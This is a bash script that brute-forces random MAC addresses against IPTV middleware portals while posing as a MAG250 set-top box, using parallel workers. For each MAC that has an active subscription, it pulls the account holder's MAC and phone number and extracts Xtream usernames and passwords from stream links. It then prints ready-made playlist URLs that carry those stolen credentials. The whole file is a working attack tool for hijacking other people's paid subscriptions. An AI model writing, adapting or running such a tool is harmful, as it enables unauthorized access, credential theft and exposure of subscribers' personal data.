#!/bin/bash

URL="${1%/}"

if [ -z "$URL" ]; then
    echo "Usage: $0 <portal-url>"
    exit 1
fi

RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[0;33m'
LIGHT_BLUE=$'\033[0;94m'
RESET=$'\033[0m'
CLEAR_LINE=$'\033[2K'

# Choose grep implementation: ggrep on macOS, grep elsewhere
if [[ "$(uname)" == "Darwin" ]]; then
    GREP="ggrep"
else
    GREP="grep"
fi

UA="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

printf 'Checking portal connectivity... '
http_code=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 10 \
  -H "User-Agent: $UA" \
  -H "Cookie: mac=00:1A:79:00:00:00; stb_lang=en; timezone=Europe/Amsterdam;" \
  "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
if [ "$http_code" = "000" ]; then
    printf '%sFAILED%s\n' "$RED" "$RESET"
    printf '%sError: Cannot reach %s (connection refused or timeout)%s\n' "$RED" "$URL" "$RESET"
    exit 1
fi
printf '%sOK (HTTP %s)%s\n' "$GREEN" "$http_code" "$RESET"

read -rp "${YELLOW}How many MACs do you want to find? ${RESET}" max_success_count
read -rp "${YELLOW}Parallel workers? [10] ${RESET}" num_workers
num_workers=${num_workers:-10}

success_file=$(mktemp)
echo "0" > "$success_file"
hit_file=$(mktemp)


hex=(0 1 2 3 4 5 6 7 8 9 A B C D E F)

# Serialized in-place line update: CR + clear-line + message, locked so
# concurrent workers can't interleave ESC sequences mid-line.
progress() {
  {
    flock -x 200
    printf '\r%s%s' "$CLEAR_LINE" "$1"
  } 200>"$success_file.lock"
}

scan_mac() {
  while true; do
    read -r current_count < "$success_file"
    ((current_count >= max_success_count)) && break

    MAC="00:1A:79:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}"

    response=$(curl -s -i \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
    token=$(echo "$response" | $GREP -oP '(?<="token":")[^"]*')

    curl -s -o /dev/null \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=stb&action=get_profile&auth_second_step=1&hw_version_2=1635b1c3e68859923ab3bb72192e089f66e7dd9e&JsHttpRequest=1-xml"

    if ! echo "$response" | $GREP -q "200"; then
      progress "scanning: $MAC ${RED}[connection failed, ratelimited?]${RESET}"
      continue
    fi

    genres=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml")

    if ! echo "$genres" | jq -e '.js[] | select(.title == "All")' > /dev/null 2>&1; then
      progress "scanning: $MAC [connected but no subscriptions.]"
      continue
    fi

    main_info=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml")
    mac_phone=$(echo "$main_info" | jq -r '.js | "\(.mac) [\(.phone)]"')

    ffplay=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=create_link&cmd=$channel&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml" \
      | jq -r 'try .js.cmd // .js[0].cmd // empty' 2>/dev/null | sed 's/^ffmpeg //')

    xtreamuser=$(echo "$ffplay" | awk -F/ '{print $4}')
    xtreampw=$(echo "$ffplay" | awk -F/ '{print $5}')

    check=$(curl -s "$URL/player_api.php?username=$xtreamuser&password=$xtreampw" | jq -r '.user_info')
    exp_date=$(echo "$check" | jq -r '.exp_date')
    max_connections=$(echo "$check" | jq -r '.max_connections')
    active_cons=$(echo "$check" | jq -r '.active_cons')

    live=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=get_ordered_list&genre=*&fav=0&sortby=name&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    vod=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=vod&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    series=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=series&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    {
      flock -x 200
      printf '\r%sfound:    %s%s%s\n' "$CLEAR_LINE" "$GREEN" "$mac_phone" "$RESET"
      [ -n "$exp_date" ] && [ "$exp_date" != "null" ] && \
        printf '%s  -> %s/get.php?username=%s&password=%s&type=m3u_plus [max=%s active=%s]%s\n' \
          "$LIGHT_BLUE" "$URL" "$xtreamuser" "$xtreampw" "$max_connections" "$active_cons" "$RESET"
      printf "%s|%s|%s|%s\n" "$MAC" "$live" "$vod" "$series" >> "$hit_file"
    } 200>"$success_file.lock"

    echo $((current_count + 1)) > "$success_file"
    read -r current_count < "$success_file"
    ((current_count >= max_success_count)) && { printf '%sTarget reached: %s MACs found.%s\n' "$LIGHT_BLUE" "$max_success_count" "$RESET"; break; }
  done
}

pids=()
for ((i=0; i<num_workers; i++)); do
  scan_mac &
  pids+=($!)
done

show_summary() {
  printf '\r%s' "$CLEAR_LINE"
  if [ -s "$hit_file" ]; then
    printf '\n%sSummary (sorted by total content):%s\n' "$LIGHT_BLUE" "$RESET"
    awk -F'|' '{print $2+$3+$4, $0}' "$hit_file" | sort -rn | cut -d' ' -f2- | while IFS='|' read -r mac live vod series; do
      printf '%s  %s%s%s  Live TV: %s  VOD: %s  Series: %s%s\n' "$LIGHT_BLUE" "$GREEN" "$mac" "$LIGHT_BLUE" "$live" "$vod" "$series" "$RESET"
    done
  fi
  rm -f "$success_file" "$success_file.lock" "$hit_file"
}

trap 'kill "${pids[@]}" 2>/dev/null; wait "${pids[@]}" 2>/dev/null; show_summary; exit 1' INT TERM

wait
show_summary
